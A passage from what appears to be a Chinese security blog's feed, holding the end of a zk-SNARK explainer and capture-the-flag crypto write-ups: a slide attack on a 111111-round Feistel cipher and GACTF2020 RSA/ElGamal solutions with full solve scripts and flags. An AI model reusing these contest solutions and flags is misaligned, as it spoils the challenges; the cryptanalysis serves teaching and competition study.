$e(E_1(A(t)),E_2(\alpha_{a}))?=e(E_1(\alpha_{a}A(t)),E_2(1))$，校验Alice传回的$E_1(A(t))$是否为$E_1(A_{i}(t))$的线性组合</p><p>2) $e(E_1(\alpha_{b}),E_2(B(t)))?=e(E_1(1),E_2(\alpha_{b}B(t)))$，校验Alice传回的$E_2(B(t))$是否为$E_2(B_{i}(t))$的线性组合</p><p>3) $e(E_1(C(t)),E_2(\alpha_{c}))?=e(E_1(\alpha_{c}C(t)),E_2(1))$，校验Alice传回的$E_1(C(t))$是否为$E_1(C_{i}(t))$的线性组合</p><p>4) $e(E_1(βL(t)),E_2(1))?=E(\beta(A(t)+B(t)+C(t)))=e(E_1(A(t))+E_1(C(t)),E_2(\beta))+e(E_1(\beta),E_2(B(t)))$，校验A,B,C中使用的为同一个解向量s</p><p>5) $e(E_1(A(t)),E_2(B(t)))?=e(E_1(H(t)),E_2(Z(t)))+e(E_1(C(t)),E_2(1))$，校验向量s正确性</p><h3 id="zcash构建zk-SNARKS"><a href="#zcash构建zk-SNARKS" class="headerlink" title="zcash构建zk-SNARKS"></a>zcash构建zk-SNARKS</h3><p><a href="https://m.mytokencap.com/news/116994" target="_blank" rel="noopener">https://m.mytokencap.com/news/116994</a></p><p>利用 libsnark 库开发 zk-SNARKs</p><p><a href="https://zhuanlan.zhihu.com/p/100809637" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/100809637</a></p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>金融密码杯2020-挑战赛</title>
      <link href="/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p>sl和coin带我躺了ojzzzz，这里仅作dec-01的记录，其他题目全是SM国密系列</p><h3 id="dec-01"><a href="#dec-01" class="headerlink" title="dec - 01"></a>dec - 01</h3><h4 id="题目文件"><a href="#题目文件" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="release.zip">Click Here to Download</a></p><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>111111 round的feistel，但每轮使用的轮密钥均相同（思维固化一直以为是差分一直卡着，111111轮想🍑</p><p>且给出的明密文对中，给出的前65536组pt前四个字节fixed(‘aaaa’)，后65526组pt后四个字节fixed(‘aaaa’)</p><p>寻找碰撞，找到满足以下条件的明密文对：</p><p>当suffix-fixed的pt在第一轮加密后的输出，恰好等于prefix-fixed的pt的第一轮输入时，</p><p>suffix-fixed的ct的左部等于prefix-fixed的ct的右部</p><p><img src= "/img/loading.gif" data-src="/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/CRYPTO_DRAW.png" alt></p><p>找到碰撞后，分别获得完整第一轮及最后一轮的输入输出，校验二者求出的key是否相同即可</p><p>当相同时即获得正确flag，对cipher解密得到flag{beginning_of_cryptanalysis_series_excited}</p><p>碰撞概率估计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>((<span class="number">2</span>**<span class="number">32</span><span class="number">-2</span>**<span class="number">16</span>)/(<span class="number">2</span>**<span class="number">32</span>))**<span class="number">65536</span></span><br><span class="line"><span class="number">0.36787663445620106</span></span><br></pre></td></tr></table></figure><p>成功找到一对碰撞的概率约为0.64，本题中恰能找到一对</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">Sbox = [<span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>, <span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>, <span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>, <span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>, <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>, <span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>, <span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>, <span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>, <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>, <span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>, <span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>]</span><br><span class="line">inv_Sbox = [Sbox.index(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'ciphertext'</span>, <span class="string">'r'</span>)</span><br><span class="line">cipher = unhexlify(f.readline().strip())</span><br><span class="line">prefix_a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">    _ = f.readline().strip().split(<span class="string">' '</span>)</span><br><span class="line">    prefix_a.append((_[<span class="number">0</span>], _[<span class="number">1</span>]))</span><br><span class="line">suffix_a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">    _ = f.readline().strip().split(<span class="string">' '</span>)</span><br><span class="line">    suffix_a.append((_[<span class="number">0</span>], _[<span class="number">1</span>]))</span><br><span class="line">prefix_a_ct_right, suffix_a_ct_left = set(), set()</span><br><span class="line">prefix_a_ct_back, suffix_a_ct_back = dict(), dict()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">    prefix_a_ct_right.add(prefix_a[i][<span class="number">1</span>][<span class="number">8</span>:])</span><br><span class="line">    prefix_a_ct_back[prefix_a[i][<span class="number">1</span>][<span class="number">8</span>:]] = i</span><br><span class="line">    suffix_a_ct_left.add(suffix_a[i][<span class="number">1</span>][:<span class="number">8</span>])</span><br><span class="line">    suffix_a_ct_back[suffix_a[i][<span class="number">1</span>][:<span class="number">8</span>]] = i</span><br><span class="line">crash = prefix_a_ct_right &amp; suffix_a_ct_left</span><br><span class="line">pairs = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> crash:</span><br><span class="line">    i, j = prefix_a_ct_back[_], suffix_a_ct_back[_]</span><br><span class="line">    pairs.append((prefix_a[i], suffix_a[j]))</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> pairs:</span><br><span class="line">    print(_)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    tmp = list(xor(x, k))</span><br><span class="line">    tmp = [Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    _ = tmp[<span class="number">1</span>:] + [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        tmp[i] = (tmp[i] + _[i]) % <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> bytes(tmp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_func</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    tmp = list(x)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        tmp[i] = (tmp[i] - tmp[i+<span class="number">1</span>]) % <span class="number">0x100</span></span><br><span class="line">    tmp = [inv_Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    <span class="keyword">return</span> xor(bytes(tmp), k)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(pair)</span>:</span></span><br><span class="line">    x = xor(unhexlify(pair[<span class="number">0</span>][<span class="number">0</span>][<span class="number">8</span>:]), unhexlify(pair[<span class="number">1</span>][<span class="number">0</span>][:<span class="number">8</span>]))</span><br><span class="line">    tmp = list(x)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        tmp[i] = (tmp[i] - tmp[i + <span class="number">1</span>]) % <span class="number">0x100</span></span><br><span class="line">    tmp = [inv_Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    key1 = xor(bytes(tmp), unhexlify(pair[<span class="number">1</span>][<span class="number">0</span>][<span class="number">8</span>:]))</span><br><span class="line">    x = xor(unhexlify(pair[<span class="number">1</span>][<span class="number">1</span>][<span class="number">8</span>:]), unhexlify(pair[<span class="number">0</span>][<span class="number">1</span>][:<span class="number">8</span>]))</span><br><span class="line">    tmp = list(x)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        tmp[i] = (tmp[i] - tmp[i + <span class="number">1</span>]) % <span class="number">0x100</span></span><br><span class="line">    tmp = [inv_Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    key2 = xor(bytes(tmp), unhexlify(pair[<span class="number">0</span>][<span class="number">1</span>][<span class="number">8</span>:]))</span><br><span class="line">    <span class="keyword">if</span> key1 == key2:</span><br><span class="line">        <span class="keyword">return</span> key1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pair <span class="keyword">in</span> pairs:</span><br><span class="line">    k = crack_key(pair)</span><br><span class="line">    <span class="keyword">if</span> k:</span><br><span class="line">        key = k</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_block</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    l, r = x[:<span class="number">4</span>], x[<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">111111</span>):</span><br><span class="line">        l, r = r, xor(l, func(r, k))</span><br><span class="line">    l, r = r, l</span><br><span class="line">    <span class="keyword">return</span> (l + r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    pt = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(x), <span class="number">8</span>):</span><br><span class="line">        pt += dec_block(x[i:i+<span class="number">8</span>], k)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line">print(dec(cipher, key))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">(('61616161c5039c68', 'ac74c268a9084661'), ('29d6d89e61616161', 'a9084661a403759e'))</span></span><br><span class="line"><span class="string">(('61616161cb9d3d82', 'e2c22abd8cf47ca5'), ('9397d96461616161', '8cf47ca5cb8de97a'))</span></span><br><span class="line"><span class="string">(('616161614e9c397d', 'a9a59268a5a34a22'), ('de59099b61616161', 'a5a34a22c8c8d126'))</span></span><br><span class="line"><span class="string">(('616161612ca7387d', '69b59568e8cf6822'), ('7f62089b61616161', 'e8cf6822ed24df26'))</span></span><br><span class="line"><span class="string">(('616161613f847d04', 'a9eae19288dcb189'), ('4e6a4de261616161', '88dcb1891503e936'))</span></span><br><span class="line"><span class="string">b'Nb=\x94'</span></span><br><span class="line"><span class="string">b'flag&#123;beginning_of_cryptanalysis_series_excited&#125;\x01'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h4 id="Link"><a href="#Link" class="headerlink" title="[Link]"></a>[Link]</h4><p><a href="http://theamazingking.com/crypto-slide.php" target="_blank" rel="noopener">http://theamazingking.com/crypto-slide.php</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(GACTF2020) - Crypto</title>
      <link href="/2020/08/30/WriteUp-GACTF2020-Crypto/"/>
      <url>/2020/08/30/WriteUp-GACTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="da-Vinci-after-rsa"><a href="#da-Vinci-after-rsa" class="headerlink" title="da Vinci after rsa"></a>da Vinci after rsa</h3><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">factor(<span class="number">0x1d42aea2879f2e44dea5a13ae3465277b06749ce9059fd8b7b4b560cd861f99144d0775ffffffffffff</span>)</span><br><span class="line"><span class="comment"># 9749 * 11237753507624591 * 9127680453986244150392840833873266696712898279308227257525736684312919750469261</span></span><br></pre></td></tr></table></figure><p>e=5，取最大的素因子p，发现e|(p-1)，AMM整出<code>b&#39;flag{weadfa9987_adwd23123_454f}&#39;</code></p><p>然后出了个古典的达芬奇密码可还行…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fb = [<span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'5'</span>, <span class="string">'8'</span>, <span class="string">'13'</span>, <span class="string">'21'</span>, <span class="string">'34'</span>, <span class="string">'55'</span>, <span class="string">'89'</span>, <span class="string">'144'</span>, <span class="string">'233'</span>, <span class="string">'377'</span>, <span class="string">'610'</span>, <span class="string">'987'</span>, <span class="string">'1597'</span>, <span class="string">'2584'</span>, <span class="string">'4181'</span>, <span class="string">'6765'</span>, <span class="string">'10946'</span>, <span class="string">'17711'</span>, <span class="string">'28657'</span>, <span class="string">'46368'</span>, <span class="string">'75025'</span>, <span class="string">'121393'</span>, <span class="string">'196418'</span>, <span class="string">'317811'</span>, <span class="string">'514229'</span>, <span class="string">'832040'</span>, <span class="string">'1346269'</span>, <span class="string">'2178309'</span>]</span><br><span class="line">fb = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> _]</span><br><span class="line">t = [<span class="number">1</span>,<span class="number">28657</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">17711</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">46368</span>,<span class="number">75025</span>,<span class="number">34</span>,<span class="number">55</span>,<span class="number">89</span>,<span class="number">610</span>,<span class="number">377</span>,<span class="number">144</span>,<span class="number">233</span>,<span class="number">1597</span>,<span class="number">2584</span>,<span class="number">4181</span>,<span class="number">6765</span>,<span class="number">10946</span>,<span class="number">987</span>]</span><br><span class="line">m = <span class="string">'weadfa9987_adwd23123_454f'</span></span><br><span class="line">s = <span class="string">'?'</span> * <span class="number">25</span></span><br><span class="line">s = <span class="string">'list(s)'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">    <span class="comment"># s[fb.index(t[i])] = m[i]</span></span><br><span class="line">    s[i] = m[fb.index(t[i])]</span><br><span class="line">print(<span class="string">''</span>.join(s))</span><br><span class="line"><span class="comment"># w5awd4fa994f87_dwad3123_2</span></span><br></pre></td></tr></table></figure><p>由于斐波那契前两个均为1，且t[0]=t[3]=1，因此将s[3]替换为m[1]，得到flag{w5aed4fa994f87_dwad3123_2}</p><h3 id="elgaml-rsa"><a href="#elgaml-rsa" class="headerlink" title="elgaml_rsa"></a>elgaml_rsa</h3><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>r以LCG生成</p><script type="math/tex; mode=display">c1=g^{r}(mod\ p)\\c2=m\cdot h^{r}(mod\ p)\\c11=g^{(Br+A)\%q}(mod\ p)\\c22=m\cdot h^{(Br+A)\%q}(mod\ p)\\g^{q}\equiv 1(mod\ p)</script><p>因此$c2^{B}\cdot h^{A}\cdot(c22)^{-1}=m^{B-1}(mod\ p)$，且在这题里检验发现gcd(B-1,p-1)=1，所以直接还原得到m</p><p>得到m，即secret后，知<code>pow(flag,e,secret)=c</code>，yafu跑次secret，得到分解结果</p><p>(ps：yafu挺离谱的…分解出的因子幂次都不告诉的…只显示出来一部分…歪日)</p><p>发现secret的一个因子<code>m0=653551912583</code>，且幂次为15</p><p>由于<code>gcd(e,(m*(m0-1))//m0)=2</code>，化简得到c’后，c’即为$pow(flag,2,m0^{15})$，AMM求二次根得到结果</p><p>对$p^{k}$的AMM，按照如下paper给出的算法，将q替换成$q^{k}$，phi等替换下即可</p><p><img src= "/img/loading.gif" data-src="/2020/08/30/WriteUp-GACTF2020-Crypto/QNy9EWc7K4enJGu.png" alt></p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g, h, A, B, p, q = </span><br><span class="line">c1, c2 = </span><br><span class="line">c11, c22 = </span><br><span class="line">M = (pow(c2, B, p) * pow(h, A, p) * inverse(c22, p)) % p</span><br><span class="line"><span class="keyword">assert</span>(GCD(B<span class="number">-1</span>, p<span class="number">-1</span>) == <span class="number">1</span>)</span><br><span class="line">secret = int(pow(M, inverse(B<span class="number">-1</span>, p<span class="number">-1</span>), p))</span><br><span class="line"><span class="comment"># yafu factor</span></span><br><span class="line">m0 = <span class="number">653551912583</span></span><br><span class="line">m = m0**<span class="number">15</span></span><br><span class="line">c = </span><br><span class="line">e = <span class="number">0x1296</span></span><br><span class="line"><span class="keyword">assert</span>(GCD(e, (m*(m0<span class="number">-1</span>))//m0) == <span class="number">2</span>)</span><br><span class="line">c = int(pow(c, inverse(e//<span class="number">2</span>,(m*(m0<span class="number">-1</span>))//m0), m))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AMM</span><span class="params">(delta, r, q, k = <span class="number">1</span>)</span>:</span> <span class="comment"># get one special a s.t. a**r \equiv delta % q**k where b_x | phi(q**k)</span></span><br><span class="line">    <span class="comment"># r, q are supposed to be primes</span></span><br><span class="line"></span><br><span class="line">    phi = (q - <span class="number">1</span>) * q**(k - <span class="number">1</span>)</span><br><span class="line">    mod = q ** k</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        rho = getRandomRange(<span class="number">1</span>, mod)</span><br><span class="line">        <span class="keyword">if</span>(pow(rho, phi // r, mod) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        s = phi</span><br><span class="line">        <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">            s //= r</span><br><span class="line">            t += <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> gcd(r, s) == <span class="number">1</span></span><br><span class="line">        alpha = inverse(r, s)</span><br><span class="line">        a, b, c, h = pow(rho, phi // r, mod),pow(delta, r * alpha - 